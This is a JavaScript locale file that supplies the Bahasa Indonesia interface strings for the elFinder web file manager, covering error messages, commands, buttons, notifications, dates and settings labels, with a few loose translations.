/**
 * Bahasa Indonesia translation
 * @author Suyadi <1441177004009@student.unsika.ac.id>
 * @author Ammar Faizi <ammarfaizi2@gmail.com>
 * @version 2022-03-02
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.id = {
		translator : 'Suyadi &lt;1441177004009@student.unsika.ac.id&gt;, Ammar Faizi &lt;ammarfaizi2@gmail.com&gt;',
		language   : 'Bahasa Indonesia',
		direction  : 'ltr',
		dateFormat : 'j F, Y H:i', // will show like: 2 Maret, 2022 12:14
		fancyDateFormat : '$1 H:i', // will show like: Hari ini 12:14
		nonameDateFormat : 'd m Y - H : i : s', // noname upload will show like: 02 03 2022 - 12 : 14 : 15
		messages   : {
			'getShareText' : 'Membagikan',
			'Editor ': 'Editor Kode',

			/********************************** errors **********************************/
			'error'                : 'Kesalahan',
			'errUnknown'           : 'Kesalahan tak dikenal.',
			'errUnknownCmd'        : 'Perintah tak dikenal.',
			'errJqui'              : 'Konfigurasi jQuery UI tidak valid. Komponen pemilih, penyeret dan penaruh harus disertakan.',
			'errNode'              : 'elFinder membutuhkan pembuatan elemen DOM.',
			'errURL'               : 'Konfigurasi elFinder tidak valid! opsi URL belum diatur.',
			'errAccess'            : 'Akses ditolak.',
			'errConnect'           : 'Tidak dapat tersambung ke backend.',
			'errAbort'             : 'Koneksi dibatalkan.',
			'errTimeout'           : 'Waktu koneksi habis.',
			'errNotFound'          : 'Backend tidak ditemukan.',
			'errResponse'          : 'Respon backend tidak valid.',
			'errConf'              : 'Konfigurasi elFinder tidak valid.',
			'errJSON'              : 'Modul PHP JSON belum terpasang.',
			'errNoVolumes'         : 'Tidak tersedia ruang kosong.',
			'errCmdParams'         : 'Parameter perintah "$1" tidak valid.',
			'errDataNotJSON'       : 'Data bukan merupakan JSON.',
			'errDataEmpty'         : 'Data masih kosong.',
			'errCmdReq'            : 'Permintaan ke backend membutuhkan nama perintah.',
			'errOpen'              : 'Tidak dapat membuka "$1".',
			'errNotFolder'         : 'Obyek ini bukan folder.',
			'errNotFile'           : 'Obyek ini bukan berkas.',
			'errRead'              : 'Tidak dapat membaca "$1".',
			'errWrite'             : 'Tidak dapat menulis ke "$1".',
			'errPerm'              : 'Ijin ditolak.',
			'errLocked'            : '"$1" ini terkunci dan tak dapat dipidahkan, diubah atau dihapus.',
			'errExists'            : 'Berkas bernama "$1" sudah ada.',
			'errInvName'           : 'Nama berkas tidak valid.',
			'errInvDirname'        : 'Nama folder salah.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'Folder tidak ditemukan.',
			'errFileNotFound'      : 'Berkas tidak ditemukan.',
			'errTrgFolderNotFound' : 'Folder tujuan "$1" tidak ditemukan.',
			'errPopup'             : 'Peramban anda mencegah untuk membuka jendela munculan. Untuk dapat membuka berkas ini ubah pengaturan pada peramban anda.',
			'errMkdir'             : 'Tidak dapat membuat folder "$1".',
			'errMkfile'            : 'Tidak dapat membuat berkas "$1".',
			'errRename'            : 'Tidak dapat mengubah nama "$1".',
			'errCopyFrom'          : 'Tidak diizinkan menyalin berkas dari volume "$1".',
			'errCopyTo'            : 'tidak diizinkan menyalin berkas ke volume "$1".',
			'errMkOutLink'         : 'Tidak dapat membuat tautan diluar volume root.', // from v2.1 added 03.10.2015
			'errUpload'            : 'Kesalahan saat mengunggah.',  // old name - errUploadCommon
			'errUploadFile'        : 'Tidak dapat mengunggah "$1".', // old name - errUpload
			'errUploadNoFiles'     : 'Tak ada berkas untuk diunggah.',
			'errUploadTotalSize'   : 'Data melampaui ukuran yang diperbolehkan.', // old name - errMaxSize
			'errUploadFileSize'    : 'Berkas melampaui ukuran yang diperbolehkan.', //  old name - errFileMaxSize
			'errUploadMime'        : 'Jenis berkas ini tidak diijinkan.',
			'errUploadTransfer'    : 'Kesalahan transfer "$1".',
			'errUploadTemp'        : 'Tidak dapat membuat file sementara untuk diupload.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'Obyek "$1" sudah ada di lokasi ini dan tidak dapat ditimpa oleh obyek jenis lain.', // new
			'errReplace'           : 'Tidak dapat menimpa "$1".',
			'errSave'              : 'Tidak dapat menyimpan "$1".',
			'errCopy'              : 'Tidak dapat menyalin "$1".',
			'errMove'              : 'Tidak dapat memindahkan "$1".',
			'errCopyInItself'      : 'Tidak dapat menyalin "$1" ke dirinya sendiri.',
			'errRm'                : 'Tidak dapat menghapus "$1".',
			'errTrash'             : 'Tidak dapat masuk ke tempat sampah.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'Tidak dapat menghapus sumber berkas.',
			'errExtract'           : 'Tidak dapat mengekstrak berkas dari "$1".',
			'errArchive'           : 'Tidak dapat membuat arsip.',
			'errArcType'           : 'Jenis arsip tidak didukung.',
			'errNoArchive'         : 'Berkas ini bukan arsip atau arsip jenis ini tidak didukung.',
			'errCmdNoSupport'      : 'Backend tidak mendukung perintah ini.',
			'errReplByChild'       : 'Folder “$1” tidak dapat ditimpa dengan berkas didalamnya.',
			'errArcSymlinks'       : 'Untuk keamanan tak diijinkan mengekstrak arsip berisi symlink atau jenis berkas yang tak diijinkan.', // edited 24.06.2012
			'errArcMaxSize'        : 'Arsip ini melampaui ukuran yang diijinkan.',
			'errResize'            : 'Tidak dapat mengubah ukuran "$1".',
			'errResizeDegree'      : 'Derajat putaran tidak valid.',  // added 7.3.2013
			'errResizeRotate'      : 'Citra tidak diputar.',  // added 7.3.2013
			'errResizeSize'        : 'Ukuran citra tidak valid.',  // added 7.3.2013
			'errResizeNoChange'    : 'Ukuran citra tidak diubah.',  // added 7.3.2013
			'errUsupportType'      : 'Jenis berkas tidak didukung.',
			'errNotUTF8Content'    : 'Berkas "$1" tidak dalam format UTF-8 dan tidak dapat disunting.',  // added 9.11.2011
			'errNetMount'          : 'Tidak dapat membaca susunan "$1".', // added 17.04.2012
			'errNetMountNoDriver'  : 'Protokol tidak didukung.',     // added 17.04.2012
			'errNetMountFailed'    : 'Tidak dapat membaca susunannya.',         // added 17.04.2012
			'errNetMountHostReq'   : 'Host harus ada.', // added 18.04.2012
			'errSessionExpires'    : 'Sesi anda telah kadaluwarsa karena lama tidak aktif.',
			'errCreatingTempDir'   : 'Tidak dapat membuat direktori sementara: "$1"',
			'errFtpDownloadFile'   : 'Tidak dapat mengunduh berkas dari FTP: "$1"',
			'errFtpUploadFile'     : 'Tidak dapat mengunggah berkas dari FTP: "$1"',
			'errFtpMkdir'          : 'Tidak dapat membuat remot direktori dari FTP: "$1"',
			'errArchiveExec'       : 'Kesalahan saat mengarsipkan berkas: "$1"',
			'errExtractExec'       : 'Kesalahan saat mengekstrak berkas: "$1"',
			'errNetUnMount'        : 'Tidak dapat melakukan mount.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'Tidak cocok untuk konversi ke UTF-8', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'Coba dengan browser yang modern, Jika akan mengupload folder.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'Waktu habis selama melakukan pencarian "$1". Hasil sementara.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'Re-authorization dibutuhkan.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'Berkas maksimal yang dipilih adalah $1.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'Tidak dapat mengembalikan berkas dari tempat sampah. Tujuan tidak ditemukan.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'Tidak ditemukan editor untuk file tipe ini.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'Terjadi kesalahan di sisi server.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'Tidak dapat mengosongkan folder "$1".', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'Ada $1 kesalahan lagi.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'Anda dapat membuat hingga $1 folder sekaligus.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'Buat arsip',
			'cmdback'      : 'Kembali',
			'cmdcopy'      : 'Salin',
			'cmdcut'       : 'Potong',
			'cmddownload'  : 'Unduh',
			'cmdduplicate' : 'Gandakan',
			'cmdedit'      : 'Sunting berkas',
			'cmdextract'   : 'Ekstrak berkas dari arsip',
			'cmdforward'   : 'Maju',
			'cmdgetfile'   : 'Pilih berkas',
			'cmdhelp'      : 'Tentang software ini',
			'cmdhome'      : 'Rumah',
			'cmdinfo'      : 'Dapatkan info',
			'cmdmkdir'     : 'Buat folder',
			'cmdmkdirin'   : 'Masuk ke folder baru', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'Buat fail',
			'cmdopen'      : 'Buka',
			'cmdpaste'     : 'Tempel',
			'cmdquicklook' : 'Pratinjau',
			'cmdreload'    : 'Muat-ulang',
			'cmdrename'    : 'Ganti nama',
			'cmdrm'        : 'Hapus',
			'cmdtrash'     : 'Sampahkan', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'Kembalikan', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'Cari berkas',
			'cmdup'        : 'Ke direktori utama',
			'cmdupload'    : 'Unggah berkas',
			'cmdview'      : 'Lihat',
			'cmdresize'    : 'Ubah ukuran & Putar',
			'cmdsort'      : 'Urutkan',
			'cmdnetmount'  : 'Baca-susun volume jaringan', // added 18.04.2012
			'cmdnetunmount': 'Lepas', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'Ke Tempat', // added 28.12.2014
			'cmdchmod'     : 'Mode mengubah', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'Membuka folder', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'Setel ulang lebar kolom', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'Layar Penuh', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'Pindah', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'Kosongkan foldernya', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'Membuka', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Mengulangi', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'Preferensi', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'Pilih Semua', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'Pilih tidak ada', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'Pilihan sebaliknya', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'Buka di jendela baru', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'Sembunyikan (Preferensi)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'Tutup',
			'btnSave'   : 'Simpan',
			'btnRm'     : 'Buang',
			'btnApply'  : 'Terapkan',
			'btnCancel' : 'Batal',
			'btnNo'     : 'Tidak',
			'btnYes'    : 'Ya',
			'btnMount'  : 'Baca susunan',  // added 18.04.2012
			'btnApprove': 'Menuju ke $1 & setujui', // from v2.1 added 26.04.2012
			'btnUnmount': 'Lepas', // from v2.1 added 30.04.2012
			'btnConv'   : 'Konversi', // from v2.1 added 08.04.2014
			'btnCwd'    : 'Disini',      // from v2.1 added 22.5.2015
			'btnVolume' : 'Volume',    // from v2.1 added 22.5.2015
			'btnAll'    : 'Semua',       // from v2.1 added 22.5.2015
			'btnMime'   : 'Jenis MIME', // from v2.1 added 22.5.2015
			'btnFileName':'Nama file',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'Simpan & Tutup', // from v2.1 added 12.6.2015
			'btnBackup' : 'Cadangan', // fromv2.1 added 28.11.2015
			'btnRename'    : 'Ubah nama',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Ubah nama(Semua)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'Sebelumnya ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'Selanjutnya ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Simpan sebagai', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'Buka folder',
			'ntffile'     : 'Buka berkas',
			'ntfreload'   : 'Muat-ulang isi folder',
			'ntfmkdir'    : 'Membuat direktori',
			'ntfmkfile'   : 'Membuat berkas',
			'ntfrm'       : 'Menghapus berkas',
			'ntfcopy'     : 'Salin berkas',
			'ntfmove'     : 'Pindahkan berkas',
			'ntfprepare'  : 'Persiapan menyalin berkas',
			'ntfrename'   : 'Ubah nama berkas',
			'ntfupload'   : 'Unggah berkas',
			'ntfdownload' : 'Mengunduh berkas',
			'ntfsave'     : 'Simpan berkas',
			'ntfarchive'  : 'Membuat arsip',
			'ntfextract'  : 'Mengekstrak berkas dari arsip',
			'ntfsearch'   : 'Mencari berkas',
			'ntfresize'   : 'Mengubah ukuran citra',
			'ntfsmth'     : 'Melakukan sesuatu',
			'ntfloadimg'  : 'Memuat citra',
			'ntfnetmount' : 'Membaca susunan volume jaringan', // added 18.04.2012
			'ntfnetunmount': 'Melepas volume jaringan', // from v2.1 added 30.04.2012
			'ntfdim'      : 'Mendapatkan dimensi citra', // added 20.05.2013
			'ntfreaddir'  : 'Membaca informasi folder', // from v2.1 added 01.07.2013
			'ntfurl'      : 'Mendapatkan URL dari link', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'Dalam mode mengubah', // from v2.1 added 20.6.2015
			'ntfpreupload': 'Sedang memverifikasi nama file yang diupload', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'Membuat file untuk didownload', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'Mengambil informasi path', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'Sedang mengupload file', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'Sedang melempar ke tempat sampah', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'Sedang mengembalikan dari tempat sampah', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'Mengecek folder tujuan', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'Mengurungkan operasi sebelumnya', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'Mengulangi yang dibatalkan sebelumnya', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'Memeriksa konten', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'Sampah', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'tak diketahui',
			'Today'       : 'Hari ini',
			'Yesterday'   : 'Kemarin',
			'msJan'       : 'Jan',
			'msFeb'       : 'Februari',
			'msMar'       : 'Merusak',
			'msApr'       : 'April',
			'msMay'       : 'Mei',
			'msJun'       : 'Jun',
			'msJul'       : 'Juli',
			'msAug'       : 'Agt',
			'msSep'       : 'Sep',
			'msOct'       : 'Okt',
			'msNov'       : 'Nop',
			'msDec'       : 'Des',
			'January'     : 'Januari',
			'February'    : 'Pebruari',
			'March'       : 'Maret',
			'April'       : 'April',
			'May'         : 'Mei',
			'June'        : 'Juni',
			'July'        : 'Juli',
			'August'      : 'Agustus',
			'September'   : 'September',
			'October'     : 'Oktober',
			'November'    : 'Nopember',
			'December'    : 'Desember',
			'Sunday'      : 'Minggu',
			'Monday'      : 'Senin',
			'Tuesday'     : 'Selasa',
			'Wednesday'   : 'Rabu',
			'Thursday'    : 'Kamis',
			'Friday'      : 'Jum \'at',
			'Saturday'    : 'Sabtu',
			'Sun'         : 'Min',
			'Mon'         : 'Sen',
			'Tue'         : 'Sel',
			'Wed'         : 'Rab',
			'Thu'         : 'Kam',
			'Fri'         : 'Jum',
			'Sat'         : 'Sab',

			/******************************** sort variants ********************************/
			'sortname'          : 'menurut nama',
			'sortkind'          : 'menurut jenis',
			'sortsize'          : 'menurut ukuran',
			'sortdate'          : 'menurut tanggal',
			'sortFoldersFirst'  : 'Utamakan folder',
			'sortperm'          : 'menurut perizinan', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'menurut mode',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'menurut pemilik',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'menurut grup',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Juga Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'FileBaru.txt', // added 10.11.2015
			'untitled folder'   : 'FolderBaru',   // added 10.11.2015
			'Archive'           : 'ArsipBaru',  // from v2.1 added 10.11.2015
			'untitled file'     : 'File Baru.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: Berkas',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'Diperlukan konfirmasi',
			'confirmRm'       : 'Anda yakin akan menghapus berkas?<br/>Ini tidak dapat kembalikan!',
			'confirmRepl'     : 'Timpa berkas lama dengan yang baru?',
			'confirmRest'     : 'Timpa berkas yang ada dengan berkas dari sampah?', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'Bukan UTF-8<br/>Konversi ke UTF-8?<br/>Konten akan berubah menjadi UTF-8 ketika disimpan dengan konversi.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'Encoding karakter file ini tidak dapat dideteksi. Itu perlu dikonversi sementara ke UTF-8 untuk diedit.<br/>Silakan pilih pengkodean karakter dari file ini.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'Telah terjadi perubahan.<br/>Kehilangan perkerjaan jika kamu tidak menyimpan.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'Anda yakin untuk membuang berkas ke tempat sampah?', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'Anda yakin ingin memindahkan item ke "$1"?', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'Terapkan ke semua',
			'name'            : 'Nama',
			'size'            : 'Ukuran',
			'perms'           : 'Perijinan',
			'modify'          : 'Diubah',
			'kind'            : 'Jenis',
			'read'            : 'baca',
			'write'           : 'tulis',
			'noaccess'        : 'tidak ada akses',
			'and'             : 'dan',
			'unknown'         : 'tak diketahui',
			'selectall'       : 'Pilih semua berkas',
			'selectfiles'     : 'Pilih berkas',
			'selectffile'     : 'Pilih berkas pertama',
			'selectlfile'     : 'Pilih berkas terakhir',
			'viewlist'        : 'Tampilan daftar',
			'viewicons'       : 'Tampilan ikon',
			'viewSmall'       : 'Ikon kecil', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'Ikon sedang', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'Ikon besar', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'Ikon ekstra besar', // from v2.1.39 added 22.5.2018
			'places'          : 'Lokasi',
			'calc'            : 'Hitung',
			'path'            : 'Alamat',
			'aliasfor'        : 'Nama lain untuk',
			'locked'          : 'Dikunci',
			'dim'             : 'Dimensi',
			'files'           : 'Berkas',
			'folders'         : 'Folder',
			'items'           : 'Pokok',
			'yes'             : 'ya',
			'no'              : 'tidak',
			'link'            : 'Tautan',
			'searcresult'     : 'Hasil pencarian',
			'selected'        : 'Pokok terpilih',
			'about'           : 'Tentang',
			'shortcuts'       : 'Pintasan',
			'help'            : 'Bantuan',
			'webfm'           : 'Pengelola berkas web',
			'ver'             : 'Versi',
			'protocolver'     : 'versi protokol',
			'homepage'        : 'Rumah proyek',
			'docs'            : 'Dokumentasi',
			'github'          : 'Ambil kami di Github',
			'twitter'         : 'Ikuti kami di twitter',
			'facebook'        : 'Gabung dengan kami di facebook',
			'team'            : 'Tim',
			'chiefdev'        : 'kepala pengembang',
			'developer'       : 'pengembang',
			'contributor'     : 'kontributor',
			'maintainer'      : 'pengurus',
			'translator'      : 'penerjemah',
			'icons'           : 'Ikon',
			'dontforget'      : 'dan jangan lupa pakai handukmu',
			'shortcutsof'     : 'Pintasan dimatikan',
			'dropFiles'       : 'Seret berkas anda kesini',
			'or'              : 'atau',
			'selectForUpload' : 'Pilih berkas untuk diunggah',
			'moveFiles'       : 'Pindahkan berkas',
			'copyFiles'       : 'Salin berkas',
			'restoreFiles'    : 'Kembalikan berkas', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'Hapus dari lokasi',
			'aspectRatio'     : 'Aspek rasio',
			'scale'           : 'Skala',
			'width'           : 'Lebar',
			'height'          : 'Tinggi',
			'resize'          : 'Ubah ukuran',
			'crop'            : 'Potong',
			'rotate'          : 'Putar',
			'rotate-cw'       : 'Putar 90 derajat ke kanan',
			'rotate-ccw'      : 'Putar 90 derajat ke kiri',
			'degree'          : '°',
			'netMountDialogTitle' : 'Baca susunan volume jaringan', // added 18.04.2012
			'protocol'            : 'Protokol', // added 18.04.2012
			'host'                : 'Tuan rumah', // added 18.04.2012
			'port'                : 'Pelabuhan', // added 18.04.2012
			'user'                : 'Pengguna', // added 18.04.2012
			'pass'                : 'Sandi', // added 18.04.2012
			'confirmUnmount'      : 'Apakah anda unmount $1?',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'Seret atau Tempel file dari browser', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'Seret file, Tempel URL atau gambar dari clipboard', // from v2.1 added 07.04.2014
			'encoding'        : 'pengkodean', // from v2.1 added 19.12.2014
			'locale'          : 'Lokasi',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'Target: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'Mencari berdasarkan inpu MIME Type', // from v2.1 added 22.5.2015
			'owner'           : 'Pemilik', // from v2.1 added 20.6.2015
			'group'           : 'Grup', // from v2.1 added 20.6.2015
			'other'           : 'Lainnya', // from v2.1 added 20.6.2015
			'execute'         : 'Eksekusi', // from v2.1 added 20.6.2015
			'perm'            : 'Izin', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'Folder kosong', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'Folder kosong\\A Seret untuk tambahkan berkas', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'Folder kosong\\A Tekan yang lama untuk tambahkan berkas', // from v2.1.6 added 30.12.2015
			'quality'         : 'Kualitas', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'Sinkronasi Otomatis',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'Pindah ke atas',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'Mendepatkan URL link', // from v2.1.7 added 9.2.2016
			'selectedItems'   : '($1) berkas dipilih', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ID Folder', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'Izin akses offline', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'Untuk mengautentikasi ulang', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'Sedang memuat...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'Membuka file bersamaan', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'Anda mencoba membuka file $1. Apakah anda ingin membuka di browser?', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'Hasil pencarian kosong dalam target', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'Sedang mengedit file', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'Anda memilih $1 berkas', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'Kamu mempunyai $i berkas di clipboard', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'Hanya pencarian bertamah untuk menampilkan tampilan sekarang', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'Mengembalikan lagi', // from v2.1.15 added 3.8.2016
			'complete'        : '$1 selesai', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'Menu konteks', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'Pembalikan halaman', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'akar volume', // from v2.1.16 added 16.9.2016
			'reset'           : 'Mengatur ulang', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'Warna background', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'Mengambil warna', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'Kotak 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'Diaktifkan', // from v2.1.16 added 4.10.2016
			'disabled'        : 'Nonaktifkan', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'Hasil pencarian kosong dalam tampilan saat ini.\\ATekan [Enter] untuk memperluas target pencarian.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'Hasil pencarian huruf pertama kosong dalam tampilan saat ini.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'Label teks', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 menit lagi', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'Buka kembali dengan penyandian yang dipilih', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'Simpan dengan pengkodean yang dipilih', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'Pilih folder', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'Pencarian huruf pertama', // from v2.1.23 added 24.3.2017
			'presets'         : 'Preset', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'Itu terlalu banyak item sehingga tidak bisa menjadi sampah.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'Area Teks', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'Kosongkan folder "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'Tidak ada item dalam folder "$1".', // from v2.1.25 added 22.6.2017
			'preference'      : 'Preferensi', // from v2.1.26 added 28.6.2017
			'language'        : 'Bahasa', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'Inisialisasi pengaturan yang disimpan di browser ini', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'Pengaturan bilah alat', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 karakter tersisa.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '... $1 baris tersisa.',  // from v2.1.52 added 16.1.2020
			'sum'             : 'Jumlah', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'Ukuran file kasar', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'Fokus pada elemen dialog dengan mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'Pilih', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'Tindakan saat memilih file', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'Buka dengan editor yang digunakan terakhir kali', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'Pilihan sebaliknya', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'Anda yakin ingin mengganti nama $1 item terpilih seperti $2?<br/>Ini tidak dapat diurungkan!', // from v2.1.31 added 4.12.2017
			'batchRename'     : 'Ganti nama batch', // from v2.1.31 added 8.12.2017
			'plusNumber'      : '+ Nomor', // from v2.1.31 added 8.12.2017
			'asPrefix'        : 'Tambahkan awalan', // from v2.1.31 added 8.12.2017
			'asSuffix'        : 'Tambahkan akhiran', // from v2.1.31 added 8.12.2017
			'changeExtention' : 'Ubah ekstensi', // from v2.1.31 added 8.12.2017
			'columnPref'      : 'Pengaturan kolom (Tampilan daftar)', // from v2.1.32 added 6.2.2018
			'reflectOnImmediate' : 'Semua perubahan akan langsung direfleksikan ke arsip.', // from v2.1.33 added 2.3.2018
			'reflectOnUnmount'   : 'Perubahan apa pun tidak akan terlihat sampai volume ini dilepas.', // from v2.1.33 added 2.3.2018
			'unmountChildren' : 'Volume berikut yang dipasang pada volume ini juga dilepas. Apakah Anda yakin untuk melepasnya?', // from v2.1.33 added 5.3.2018
			'selectionInfo'   : 'Info Seleksi', // from v2.1.33 added 7.3.2018
			'hashChecker'     : 'Algoritma untuk menampilkan hash file', // from v2.1.33 added 10.3.2018
			'infoItems'       : 'Item Info (Panel Info Pilihan)', // from v2.1.38 added 28.3.2018
			'pressAgainToExit': 'Tekan lagi untuk keluar.', // from v2.1.38 added 1.4.2018
			'toolbar'         : 'Bilah Alat', // from v2.1.38 added 4.4.2018
			'workspace'       : 'Ruang Kerja', // from v2.1.38 added 4.4.2018
			'dialog'          : 'Dialog', // from v2.1.38 added 4.4.2018
			'all'             : 'Semua', // from v2.1.38 added 4.4.2018
			'iconSize'        : 'Ukuran Ikon (Tampilan ikon)', // from v2.1.39 added 7.5.2018
			'editorMaximized' : 'Buka jendela editor yang dimaksimalkan', // from v2.1.40 added 30.6.2018
			'editorConvNoApi' : 'Karena konversi oleh API saat ini tidak tersedia, harap konversi di situs web.', //from v2.1.40 added 8.7.2018
			'editorConvNeedUpload' : 'Setelah konversi, Anda harus mengunggah dengan URL item atau file yang diunduh untuk menyimpan file yang dikonversi.', //from v2.1.40 added 8.7.2018
			'convertOn'       : 'Konversi di situs $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Integrasi', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'ElFinder ini memiliki layanan eksternal berikut yang terintegrasi. Silakan periksa syarat penggunaan, kebijakan privasi, dll. sebelum menggunakannya.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Tampilkan item tersembunyi', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Sembunyikan item tersembunyi', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Tampilkan/Sembunyikan item tersembunyi', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'Jenis file untuk diaktifkan dengan "File baru"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Jenis file teks', // from v2.1.41 added 7.8.2018
